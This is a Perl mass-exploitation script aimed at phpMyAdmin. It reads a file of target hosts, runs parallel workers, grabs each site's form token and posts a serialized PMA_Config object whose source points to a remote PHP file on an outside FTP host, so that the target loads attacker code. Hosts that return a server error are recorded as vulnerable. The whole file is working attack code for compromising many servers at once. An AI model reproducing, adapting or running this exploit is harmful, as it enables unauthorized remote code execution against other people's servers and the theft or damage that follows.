#!/usr/bin/perl 

use strict; 
use Parallel::ForkManager;
use IO::Socket;
use Getopt::Long;
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
use HTTP::Cookies;

my $hostfile; 
my $maximumprocess; 

GetOptions(
	'exploit|x' => \&exploit,
        'h|hostfile=s'    => \$hostfile,
        't|threads=s'      => \$maximumprocess,
        'help'        => \&usage
    );

my $len = @ARGV; 

if($len != 1) {
   usage(); 
}

sub usage {

print "\033[2J";
print "\033[0;0H";
print " \e[32;1m\

██████╗ ███╗   ███╗ █████╗     ██████╗  ██████╗███████╗
██╔══██╗████╗ ████║██╔══██╗    ██╔══██╗██╔════╝██╔════╝
██████╔╝██╔████╔██║███████║    ██████╔╝██║     █████╗  
██╔═══╝ ██║╚██╔╝██║██╔══██║    ██╔══██╗██║     ██╔══╝  
██║     ██║ ╚═╝ ██║██║  ██║    ██║  ██║╚██████╗███████╗
╚═╝     ╚═╝     ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                                       
";

   print ("\n\e[37;1m[\e[32;1m+\e[37;1m] \e[1;31;1mUsage: $0 -h <hostfile> -t <threads> -x \e[0m\n\n");

}
sub exploit {

   if (!-e $hostfile) {
      die "\e[37;1m[\e[32;1m+\e[37;1m] \e[1;31;1mCRITICAL! Host file does not seem to exist: $hostfile\e[0m\n";
   }  

   my $total = `grep -c . $hostfile`;
   chomp($total);
   my $curhost = 0;
   my $forkmanager = new Parallel::ForkManager($maximumprocess);
   
   open(my $hostfileh, "<" . $hostfile);

   while (<$hostfileh>) {
     my $host = $_;
     $host =~ s/\x0a//g;
     chomp($host);
     
     $curhost = $curhost + 1;
     chomp($curhost);

     my $processid = $forkmanager->start() and next;
     my $ua = LWP::UserAgent->new(agent => "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]", env_proxy => 1, keep_alive => 1,timeout => 40);
    
     my $url = $host;
     my $ftp = "ftp://1.1.1.1/rasta.php";
     my $len = length($ftp);
     my $code = "a:1:\{i:0\;O:10:\"PMA_Config\":1:\{s:6:\"source\"\;s:" . $len . ":\"". $ftp ."\"\;\}\}";
     $code =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
     
     my $cookie = HTTP::Cookies->new;
     my $token;
     my $req = HTTP::Request->new("GET", $url);
     my $res = $ua->request($req);

     my $join = join("",$res->as_string);
     if ($token=$join=~m#name="token" value="(.+?)"#sg) {
         $token = $1;
     }
     else {
        print qq (\e[0;32m[\e[1;33m+\e[0;32m]\e[0;31mDEAD IP\e[1;33m -> \e[0;32m$host \e[0;31m[\e[0;31m$curhost \e[1;33mof \e[0;32m$total\e[0;32m]\e[0;32m\n);
        exit;
     }

     $cookie->extract_cookies($res);
     my $attempt = "action=lay_navigation&eoltype=unix&token=" . $token . "&configuration=" . $code;
     $req = HTTP::Request->new("POST", $url);
     $cookie->add_cookie_header($req);
     $req->header(Referer => $url);
     $req->content_type('application/x-www-form-urlencoded');
     $req->content($attempt);
     
     $res = $ua->request($req);
     my $data = $res->as_string;
     if ($data =~ m#500(.+?)#sg) {
        print("\e[1;33m[\e[0;31m+\e[1;33m]\e[0;32mVulnerable\e[0;31;33m -> $host \e[0m\n");
        open(OUT, ">> vulns.txt");
        print OUT ("$host\n");
        close OUT;
     }
     $forkmanager->finish();
   }

   close($hostfileh);
   $forkmanager->wait_all_children();
}
